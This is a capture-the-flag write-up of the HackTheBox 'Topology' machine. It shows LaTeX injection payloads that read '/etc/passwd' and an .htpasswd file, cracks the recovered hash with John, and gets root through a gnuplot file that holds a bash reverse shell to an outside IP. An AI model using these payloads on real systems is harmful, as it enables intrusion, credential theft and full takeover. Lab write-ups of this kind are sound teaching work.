---
title: "Topology HackTheBox"
layout: post
date: 2023-11-04 20:00
tag: 
- HackTheBox
- Pentesting
- Topology
- Linux
- Easy
- Gnuplot
- LaTeX
image: https://www.hackthebox.com/storage/avatars/cbfa26b4a4044677e93779a44bbd458f.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "An easy retired HackTheBox machine."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

An easy HackTheBox machine that envolves a virtual host which is vulnerable to LaTeX injection vulnerability.

---

# Nmap

```bash
nmap -A -T4 10.10.11.217
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 12:55 +01
Nmap scan report for 10.10.11.217
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have two ports open, let's check the web page at port 80 :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031125816.png>)

I added the `topology.htb` to my */etc/hosts* and started enumerating for hidden directories or subdomains, Gobuster didn't output anything useful, but ffuf did :

# Fuff

```bash
ffuf -u http://topology.htb -c -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt -H "Host: FUZZ.topology.htb" -fs 6767

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://topology.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
 :: Header           : Host: FUZZ.topology.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 6767
________________________________________________

dev                     [Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 194ms]
stats                   [Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 1418ms]
:: Progress: [2280/2280] :: Job [1/1] :: 23 req/sec :: Duration: [0:00:54] :: Errors: 0 ::
```

The `dev.topology.htb` requires authorization :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031151647.png>)

I went back to my web page and found there is a project about LaTeX :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031143758.png>)

When I clicked on it, it redirects me to another subdomain `latex.topology.htb` :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031143827.png>)

There I can use the equation generator to create a PNG file :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031143944.png>)

So I thought about some sort of LaTeX injection which I found that it does exists :

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection

I tired the bellow payload but I see there is a filtering :

```bash
\input{/etc/passwd}
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031144014.png>)

The payload bellow actually worked so we bypassed the first part of filtering now I should customize it to bypass there filter :

```bash
\lstinputlisting{/etc/passwd}
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031144205.png>)

```bash
$\lstinputlisting{/etc/passwd}$
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031144332.png>)

And yes by adding $ I was able to bypass it, now I can read files on the server :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031144408.png>)

I remembered the subdomain found before `dev.topology.htb` and said let's try if I can read the .htpasswd file which is used to store usernames and password for basic authentication of HTTP users :

```bash
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031145635.png>)

And that was the case, we found credentials of `vdaisley` user, I needed just to crack the encrypted password using John :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031145614.png>)

`vdaisley : $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (?)     
1g 0:00:00:05 DONE (2023-10-31 15:10) 0.1964g/s 195621p/s 195621c/s 195621C/s callel..caitlyn09
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`vdaisley : calculus20`

Now I can access the `dev.topology.htb`, there was nothing useful so I tried if there is password reusing to login via SSH :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031151611.png>)

# User flag

Fortunately that was the case and I am in as `vdaisley` user :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031151722.png>)

# PE

While trying to privesc, I checked running processes using pspy tool and found there is a process running every minute by root which looks for files with .plt extension in */opt/gnuplot* and executes them.

>Gnuplot is a command-line and GUI program that can generate two and three-dimensional plots of functions, data, and data fits.

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031154344.png>)

I have write permissions on the */opt/gnuplot* directory, so I thought about creating a malicious plt file which will be executed by root and privesc :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031154427.png>)

 https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation

```bash
system "bash -c 'bash -i >& /dev/tcp/10.10.14.141/9999 0>&1'"
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031154916.png>)

I created a file named 'exploit.plt' and waited till it's executed and BOOM I got a root shell :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231031154951.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>